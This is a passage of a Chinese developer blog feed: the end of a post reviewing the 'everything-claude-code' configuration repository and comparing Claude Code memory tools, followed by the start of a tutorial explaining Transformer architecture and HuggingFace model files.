|   |-- e2e.md              <span class="hljs-comment"># /e2e - E2E 测试生成</span>
|   |-- code-review.md      <span class="hljs-comment"># /code-review - 质量审查</span>
|   |-- build-fix.md        <span class="hljs-comment"># /build-fix - 修复构建错误</span>
|   |-- refactor-clean.md   <span class="hljs-comment"># /refactor-clean - 死代码移除</span>
|   |-- learn.md            <span class="hljs-comment"># /learn - 会话中提取模式（详细指南）</span>
|   |-- checkpoint.md       <span class="hljs-comment"># /checkpoint - 保存验证状态（详细指南）</span>
|   |-- verify.md           <span class="hljs-comment"># /verify - 运行验证循环（详细指南）</span>
|   |-- setup-pm.md         <span class="hljs-comment"># /setup-pm - 配置包管理器</span>
|   |-- go-review.md        <span class="hljs-comment"># /go-review - Go 代码审查（新增）</span>
|   |-- go-test.md          <span class="hljs-comment"># /go-test - Go TDD 工作流（新增）</span>
|   |-- go-build.md         <span class="hljs-comment"># /go-build - 修复 Go 构建错误（新增）</span>
|   |-- skill-create.md     <span class="hljs-comment"># /skill-create - 从 git 历史生成技能（新增）</span>
|   |-- instinct-status.md  <span class="hljs-comment"># /instinct-status - 查看学习的直觉（新增）</span>
|   |-- instinct-import.md  <span class="hljs-comment"># /instinct-import - 导入直觉（新增）</span>
|   |-- instinct-export.md  <span class="hljs-comment"># /instinct-export - 导出直觉（新增）</span>
|   |-- evolve.md           <span class="hljs-comment"># /evolve - 将直觉聚类到技能中（新增）</span>
|
|-- rules/            <span class="hljs-comment"># 始终遵循的指南（复制到 ~/.claude/rules/）</span>
|   |-- security.md         <span class="hljs-comment"># 强制性安全检查</span>
|   |-- coding-style.md     <span class="hljs-comment"># 不可变性、文件组织</span>
|   |-- testing.md          <span class="hljs-comment"># TDD、80% 覆盖率要求</span>
|   |-- git-workflow.md     <span class="hljs-comment"># 提交格式、PR 流程</span>
|   |-- agents.md           <span class="hljs-comment"># 何时委托给子代理</span>
|   |-- performance.md      <span class="hljs-comment"># 模型选择、上下文管理</span>
|
|-- hooks/            <span class="hljs-comment"># 基于触发器的自动化</span>
|   |-- hooks.json                <span class="hljs-comment"># 所有钩子配置（PreToolUse、PostToolUse、Stop 等）</span>
|   |-- memory-persistence/       <span class="hljs-comment"># 会话生命周期钩子（详细指南）</span>
|   |-- strategic-compact/        <span class="hljs-comment"># 压缩建议（详细指南）</span>
|
|-- scripts/          <span class="hljs-comment"># 跨平台 Node.js 脚本（新增）</span>
|   |-- lib/                     <span class="hljs-comment"># 共享工具</span>
|   |   |-- utils.js             <span class="hljs-comment"># 跨平台文件/路径/系统工具</span>
|   |   |-- <span class="hljs-keyword">package</span>-manager.js   <span class="hljs-comment"># 包管理器检测和选择</span>
|   |-- hooks/                   <span class="hljs-comment"># 钩子实现</span>
|   |   |-- session-start.js     <span class="hljs-comment"># 会话开始时加载上下文</span>
|   |   |-- session-end.js       <span class="hljs-comment"># 会话结束时保存状态</span>
|   |   |-- pre-compact.js       <span class="hljs-comment"># 压缩前状态保存</span>
|   |   |-- suggest-compact.js   <span class="hljs-comment"># 战略性压缩建议</span>
|   |   |-- evaluate-session.js  <span class="hljs-comment"># 从会话中提取模式</span>
|   |-- setup-<span class="hljs-keyword">package</span>-manager.js <span class="hljs-comment"># 交互式 PM 设置</span>
|
|-- tests/            <span class="hljs-comment"># 测试套件（新增）</span>
|   |-- lib/                     <span class="hljs-comment"># 库测试</span>
|   |-- hooks/                   <span class="hljs-comment"># 钩子测试</span>
|   |-- run-all.js               <span class="hljs-comment"># 运行所有测试</span>
|
|-- contexts/         <span class="hljs-comment"># 动态系统提示注入上下文（详细指南）</span>
|   |-- dev.md              <span class="hljs-comment"># 开发模式上下文</span>
|   |-- review.md           <span class="hljs-comment"># 代码审查模式上下文</span>
|   |-- research.md         <span class="hljs-comment"># 研究/探索模式上下文</span>
|
|-- examples/         <span class="hljs-comment"># 示例配置和会话</span>
|   |-- CLAUDE.md           <span class="hljs-comment"># 示例项目级配置</span>
|   |-- user-CLAUDE.md      <span class="hljs-comment"># 示例用户级配置</span>
|
|-- mcp-configs/      <span class="hljs-comment"># MCP 服务器配置</span>
|   |-- mcp-servers.json    <span class="hljs-comment"># GitHub、Supabase、Vercel、Railway 等</span>
|
|-- marketplace.json  <span class="hljs-comment"># 自托管市场配置（用于 /plugin marketplace add）</span>
</code></pre>
<p>这个仓库有多少东西？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f5022bd62be459b8942d333c5a04be0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=34LxTZLEojx3RnGzP3dVKBw0tns%3D" alt="Image" loading="lazy"/></p>
<p>两个新增的生态系统工具</p>
<p>技能创建器
两种方式从你的仓库生成Claude Code技能：
本地分析：用 /skill-create命令
GitHub应用：高级功能、自动PR、团队共享</p>
<p>持续学习v2
基于直觉的学习系统：
/instinct-status - 查看学习的直觉
/instinct-import - 导入他人的直觉
/instinct-export - 导出你的直觉
/evolve - 将相关直觉聚类到技能中</p>
<p>老金我建议先读the-shortform-guide.md，把基础配置搞定。
然后再读the-longform-guide.md，学习进阶技巧。</p>
<h2 data-id="heading-11">老金实测效果</h2>
<p>老金我用了一周，说说真实感受。</p>
<p>Token消耗降了
按照作者的模型选择建议，简单任务用Haiku，复杂任务才用Opus。
把几个MCP换成CLI+Skills。
老金我统计了一下，token消耗大概降了30%。</p>
<p>开发效率提升
用了Two-Instance Kickoff Pattern开新项目。
以前搭建项目骨架要半天，现在两个小时搞定。</p>
<p>代码质量上去了
有了5阶段Agent编排，很多问题在早期就被发现了。
返工率从30%降到了10%左右。</p>
<p>Context Rot问题缓解了
Memory Persistence Hooks真的有用。
之前20轮就开始"失忆"，现在50轮还能记住。</p>
<h2 data-id="heading-12">需要注意的地方</h2>
<p>有学习成本
这套东西功能很全，但刚上手需要花时间理解。
老金我建议先从Token优化开始，这个见效最快。</p>
<p>需要根据项目调整
作者的配置是通用的，但每个项目情况不同。
比如模型选择、Agent编排，你得根据自己的任务类型调整。</p>
<p>复合效应需要时间
前期投入时间构建Skills、Commands、Agents。
后期才能享受复利。
不要期望立竿见影。</p>
<h2 data-id="heading-13">为什么这个仓库能火？</h2>
<p>老金我分析了一下，28.8k星不是白来的。</p>
<p>解决真痛点
Token消耗高、Context Rot、效率低，这些是Claude Code用户的普遍问题。
这个仓库提供了一套系统性的解决方案。</p>
<p>实战验证
这不是作者拍脑袋想出来的配置，而是10个月实际使用、不断迭代的结果。
黑客松冠军本身就是最好的背书。</p>
<p>方法论完整
不只是给你配置文件，还告诉你为什么这样做。
从Token优化到Agent编排到复合效应，形成闭环。</p>
<p>文档写得好
作者写了两份指南，shortform和longform。
从入门到进阶，覆盖完整。
老金我读完longform guide，学到了很多之前不知道的技巧。</p>
<hr/>
<h2 data-id="heading-14">四种记忆方案怎么选？</h2>
<p>老金我之前介绍过3个记忆方案，这里统一对比一下。</p>
<p>方案1：claude-mem（轻量工具）
两行命令安装，自动捕获对话存到本地数据库。
只支持Claude Code，简单省事。
适合只想解决记忆问题、不想折腾的人。</p>
<p>方案2：mcp-memory-service（重量工具）
支持13+个AI客户端，有混合存储、智能分类、团队协作。
功能强大，但配置复杂。
适合跨多个AI工具用、有团队协作需求的人。</p>
<p>方案3：openclaw三层架构（概念性）
知识图谱+每日笔记+隐性知识，是一种记忆设计思路。
适合理解记忆系统的原理，但需要自己实现。</p>
<p>方案4：everything-claude-code（本文介绍）
不只是记忆，是一套完整的Claude Code工作流方法论。
包括Token优化、Agent编排、并行化、验证循环、复合效应。
记忆只是其中一小部分，用Hooks实现。
适合想要系统性提升Claude Code使用效率的人。</p>
<p>怎么选？
只想解决记忆问题，选claude-mem，最简单。
想跨多个AI工具用，选mcp-memory-service，最强大。
想要完整的Claude Code方法论，选everything-claude-code，本文介绍的。</p>
<p>这些方案可以组合使用，不冲突。</p>
<hr/>
<p>前3篇文章地址：</p>
<ul>
<li>claude-mem：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI0NzU2MDgyNA%3D%3D%26mid%3D2247490130%26idx%3D1%26sn%3Dcb9032f50e8017646cb4021c5a423b29%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI0NzU2MDgyNA==&amp;mid=2247490130&amp;idx=1&amp;sn=cb9032f50e8017646cb4021c5a423b29&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Claude Code开始失忆了？两大记忆神器帮你选</a></li>
<li>mcp-memory-service：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI0NzU2MDgyNA%3D%3D%26mid%3D2247490195%26idx%3D1%26sn%3Dd5dba3d7bff4e486c6d02a5f8973e9e2%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI0NzU2MDgyNA==&amp;mid=2247490195&amp;idx=1&amp;sn=d5dba3d7bff4e486c6d02a5f8973e9e2&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">烦透了每次给Claude重复背景？手把手教你装这个神器，终极记忆神器</a></li>
<li>openclaw三层架构：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI0NzU2MDgyNA%3D%3D%26mid%3D2247491035%26idx%3D1%26sn%3Dd8f8bb398a5ee4caddb4129b373fb528%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI0NzU2MDgyNA==&amp;mid=2247491035&amp;idx=1&amp;sn=d8f8bb398a5ee4caddb4129b373fb528&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">蹭上150k Star的热点，从clawdbot学会了给AI加自动记忆！</a></li>
</ul>
<h2 data-id="heading-15">老金建议</h2>
<p>如果你每天都在用Claude Code写代码，这个仓库值得花时间研究。</p>
<p>第一步：先读the-shortform-guide.md，把基础配置搞定。
第二步：学习Token优化策略，调整模型选择，用mgrep替代grep。
第三步：尝试5阶段Agent编排，让工作流更系统化。
第四步：把常用的MCP换成CLI+Skills，节省上下文和token。
第五步：投资可复用的模式，享受复合效应。</p>
<p>老金我最近在把这套方法论融合到自己的项目里。
等用一段时间，再给你们写个深度测评。</p>
<p>有问题随时问老金我，一起交流！</p>
<hr/>
<p><strong>往期推荐：</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzI0NzU2MDgyNA%3D%3D%26action%3Dgetalbum%26album_id%3D3704202865347362819%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI0NzU2MDgyNA==&amp;action=getalbum&amp;album_id=3704202865347362819#wechat_redirect" ref="nofollow noopener noreferrer">AI编程教程列表</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzI0NzU2MDgyNA%3D%3D%26action%3Dgetalbum%26album_id%3D4120385726238392327%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI0NzU2MDgyNA==&amp;action=getalbum&amp;album_id=4120385726238392327#wechat_redirect" ref="nofollow noopener noreferrer">提示词工工程（Prompt Engineering）</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzI0NzU2MDgyNA%3D%3D%26action%3Dgetalbum%26album_id%3D3171759118513111043%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI0NzU2MDgyNA==&amp;action=getalbum&amp;album_id=3171759118513111043#wechat_redirect" ref="nofollow noopener noreferrer">LLMOPS(大语言模运维平台)</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzI0NzU2MDgyNA%3D%3D%26action%3Dgetalbum%26album_id%3D3192433076551843848%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI0NzU2MDgyNA==&amp;action=getalbum&amp;album_id=3192433076551843848#wechat_redirect" ref="nofollow noopener noreferrer">AI绘画教程列表</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzI0NzU2MDgyNA%3D%3D%26action%3Dgetalbum%26album_id%3D3502843007181520907%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI0NzU2MDgyNA==&amp;action=getalbum&amp;album_id=3502843007181520907#wechat_redirect" ref="nofollow noopener noreferrer">WX机器人教程列表</a></p>
<hr/>
<p>每次我都想提醒一下，这不是凡尔赛，是希望有想法的人勇敢冲。
我不会代码，我英语也不好，但是我做出来了很多东西，在文末的开源知识库可见。
我真心希望能影响更多的人来尝试新的技巧，迎接新的时代。</p>
<p>谢谢你读我的文章。
如果觉得不错，随手点个赞、在看、转发三连吧🙂
如果想第一时间收到推送，也可以给我个星标⭐～谢谢你看我的文章。</p>
<p>开源知识库地址：
<a href="https://link.juejin.cn?target=https%3A%2F%2Ftffyvtlai4.feishu.cn%2Fwiki%2FOhQ8wqntFihcI1kWVDlcNdpznFf" target="_blank" title="https://tffyvtlai4.feishu.cn/wiki/OhQ8wqntFihcI1kWVDlcNdpznFf" ref="nofollow noopener noreferrer">tffyvtlai4.feishu.cn/wiki/OhQ8wq…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[大模型实战 03] 拆解 Transformers：从原理图解到 HuggingFace Transformers 实战]]></title>    <link>https://juejin.cn/post/7603183929251627060</link>    <guid>https://juejin.cn/post/7603183929251627060</guid>    <pubDate>2026-02-05T11:26:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603183929251627060" data-draft-id="7603183929251610676" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[大模型实战 03] 拆解 Transformers：从原理图解到 HuggingFace Transformers 实战"/> <meta itemprop="keywords" content="人工智能,深度学习"/> <meta itemprop="datePublished" content="2026-02-05T11:26:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿尔的代码屋"/> <meta itemprop="url" content="https://juejin.cn/user/2637068702854868"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [大模型实战 03] 拆解 Transformers：从原理图解到 HuggingFace Transformers 实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2637068702854868/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿尔的代码屋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T11:26:04.000Z" title="Thu Feb 05 2026 11:26:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">[大模型实战 03] 拆解 Transformers：从原理图解到 HuggingFace Transformers 实战</h2>
<blockquote>
<p><strong>核心摘要 (TL;DR)</strong></p>
<ul>
<li><strong>原理</strong>：图解 Transformer 是如何通过“注意力机制”和“位置编码”来理解人类语言的。</li>
<li><strong>实战</strong>：在 <strong>Kaggle (双 T4 GPU)</strong> 环境下，拆解 HuggingFace 代码的“铁三角”（Config, Tokenizer, Model）。</li>
<li><strong>技巧</strong>：掌握 <code>Temperature</code> 和 <code>Top_p</code>，学会控制 AI 的“创造力”。</li>
</ul>
</blockquote>
<h3 data-id="heading-1">前言</h3>
<p>各位友人们，大家好，这里是阿尔。在上一节的“炼丹”环境搭建中，咱们成功地将Qwen2.5模型运行了起来，跑通了。 但是相信大家对运行的时候的那些参数都代表着什么，都还是懵的。 这篇博客就是为此准备的，我们打算先快速大概地了解一下当前的大模型的底层原理，再结合在一起介绍通用的transformers库, 去看看代码和如何对应这些理论的。</p>
<h3 data-id="heading-2">1. Transformer 极简原理：大模型是怎么思考的？</h3>
<p>大模型和普通的机器学习模型一样，本质也是一个函数，不同的是，传统机器学习可能输入的是一些整理好的数据，比如房子的尺寸，地段，购买时长，和市中心的距离等等数据，输出一个预测的放假，而大模型输入的是我们的问题，拿到的是大模型给出的回答。但，咱们究其根本，它们都可以看作是一个函数，我们输入一些东西，经过运算之后，输出给我们一些东西。</p>
<p>对于大模型，它的本质就是一个<strong>下一个字符预测器</strong>，我们输入一些文字，它只负责根据它所训练的海量数据，输出最符合，最有可能的下一个字符，就像一个<strong>文字接龙机器</strong>，其核心任务只有一个：<strong>根据上文，猜下一个字是什么。</strong></p>
<p>为了实现这个目标，Transformer 架构经历了一个精密的流水线：
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/01_cover.png" alt="包含Transformer的5个步骤的总览图" loading="lazy"/>
下面，我们会稍微详细一点地介绍一下各个步骤。</p>
<h4 data-id="heading-3">1.1 第一步：Token 化 (Tokenization) —— 查字典</h4>
<p>大模型既然是一个函数，那么肯定是针对数字进行处理的，所以，我们就需要一个法子，去将我们的文字字符（甚至是图片）变成大模型认识的数字（或者说张量，向量）。 这就是Token化，去做这一步操作的函数，或者模块就是<strong>分词器（Tokenizer）</strong>。</p>
<p>那么<strong>Tokenizer</strong>具体是如何工作的？它实际上就是将一个个的字符，对应成一个个数字，或者说ID，就像ASCII码一样，不过它做得更高级。</p>
<p>把每一个字都找一个数字对应，有点奢侈，特别是对于英语,act, acting,action,actor其实都有相同的词根，主要的语义来源于其词根act，所以分词器是按照词元（token）去拆分的，能把有些词拆成词根、前缀和后缀等等，当然具体如何拆，取决于字典如何定义，字典有多大。</p>
<p>这里我们给一个简单的例子</p>
<ul>
<li><strong>输入</strong>：“我爱 AI”</li>
<li><strong>动作</strong>：切分 -&gt; <code>["我", "爱", "AI"]</code> -&gt; 查表 -&gt; <code>[2301, 452, 1083]</code>
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/1.1_tokenization.png" alt="Token化的示意图" loading="lazy"/></li>
</ul>
<h4 data-id="heading-4">1.2 第二步：Embedding &amp; 位置编码 —— 赋予含义与顺序</h4>
<p>有了token之后，我们想知道词和词的关系，我们想要通过一个可以量化的量去判断两个词是否是有关系的，关系多大。这就引入了我们的下一个模块，词嵌入模块（Embedding）。</p>
<ul>
<li><strong>Embedding (词向量)</strong>：把每个 ID 变成一个长长的向量（比如 4096 维的数组）。这个向量在模型训练之前是随机的，其后随着海量的训练数据洗礼，越相关的词向量越靠近，越不相关的词越远离。这个向量代表了词的<strong>含义</strong>。比如“猫”和“狗”的向量在空间里距离很近，“苹果”和“手机”在某种语境下也更近。</li>
</ul>
<p>光知道词和词的关系还不够，“我爱你”和“你爱我”的每一个词都是相同的，但是它们确实可以不相关的两个句子，“小狗咬了我”和“我咬了小狗”，也会被人视作“可以正常理解”和“这人好像不对劲”两种完全不同的理解。显而易见，词语在句中的位置是一个非常重要的信息，我们不能弄丢它，也需要将这一部分信息传递给模型训练时候去学习。</p>
<ul>
<li><strong>Positional Encoding (位置编码)</strong>：Transformer 是并行计算的（它一眼看完所有词），这导致它不知道“我爱你”和“你爱我”的区别。所以，我们需要给每个词贴上一个“座位号”，告诉模型谁在前面，谁在后面。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/1.2_ebedding.png" alt="Embedding &amp; 位置编码 —— 赋予含义与顺序示意图" loading="lazy"/></li>
</ul>
<h4 data-id="heading-5">1.3 第三步：Self-Attention (自注意力) —— 寻找关系</h4>
<p>接下来就是大模型的灵魂，我们想知道一句话里的每一个词元和其他词元的<strong>关联度</strong>，其实就是上下文的联系。当模型处理“苹果”这个词时，如果上下文里有“手机”、“发布会”，注意力机制会告诉模型：“嘿，这里的‘苹果’指的是科技公司，不是水果！”,自注意力机制，让模型能理解上下文。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/1.3-self-attention.png" alt="Self-Attention 示意图" loading="lazy"/></p>
<h4 data-id="heading-6">1.4 第四步：MLP (前馈神经网络) —— 消化吸收</h4>
<p>如果说注意力机制是“看”，那么 MLP 就是“想”。它包含多层神经元，负责对提取到的信息进行复杂的非线性变换和逻辑推理,也就是传统的深度学习。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/1.4-mlp.png" alt="MLP (前馈神经网络)示意图" loading="lazy"/></p>
<h4 data-id="heading-7">1.5 第五步：Decoder &amp; Softmax —— 输出概率</h4>
<p>经过层层计算，模型最终会输出一个包含了所有词汇（比如 15 万个词）的<strong>概率列表</strong>。</p>
<ul>
<li><code>AI</code> (80%)</li>
<li><code>吃</code> (10%)</li>
<li><code>睡</code> (5%)
...
最后，我们根据这个概率列表，选择下一个词。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/1.5-decoder&amp;softmax.png" alt="输出概率的示意图" loading="lazy"/></li>
</ul>
<hr/>
<p>这就是大模型词语接龙的原理了。</p>
<h3 data-id="heading-8">2. 拆解模型文件夹：下载下来的到底是什么？</h3>
<p>理论讲完了，我们来看看在 <strong>Kaggle</strong> 的文件系统里，这些理论变成了什么文件。</p>
<p>当你下载一个模型（以 Qwen2.5-7B 为例）时，文件夹结构如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/safetensor.png" alt="safetensor格式的文件组织示意图" loading="lazy"/></p>
<h4 data-id="heading-9">2.1 核心架构：config.json</h4>
<p><strong>config.json</strong>: 是大模型的身份证，也可以说是体检表，它其中就是真正的我们的模型，具体由哪些层构成，是什么架构类型，隐藏层有多深，注意力头的数量有几个，词表的大小是多少。对于大模型而言，它就是模型本身，也是<strong>骨架</strong>，因为大模型重要的是训练完的参数，模型本身是很小的。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/config.json.png" alt="config.json的示意图" loading="lazy"/></p>
<h4 data-id="heading-10">2.2 行为预设：generation_config.json</h4>
<p><strong>generation_config.json</strong>:是模型的出厂默认设置。
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm03-know-more-about-transformer-lib/generation_config_.png" alt="generation_config的示意图" loading="lazy"/></p>
<h4 data-id="heading-11">2.3 大脑本身：*.safetensors和*.index.json</h4>
<p>有了config.json中的躯体，我们再从*.safetensors和*.index.json载入灵魂，这才是我们能说会道的大模型。</p>
<ul>
<li><strong><code>model-xxxxx.safetensors</code></strong>：这里面存的是实打实的<strong>张量（Tensor）数据</strong>，即数十亿个参数的浮点数。为了方便存储和加载，通常会被切分成多个 2GB-5GB 的小文件（Shard）。</li>
<li><strong><code>model.safetensors.index.json</code></strong>：这是一张<strong>藏宝图</strong>。因为权重被切分了，模型需要知道“第 5 层的权重”到底藏在哪个文件里。
<ul>
<li><strong>内部长这样</strong>：
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
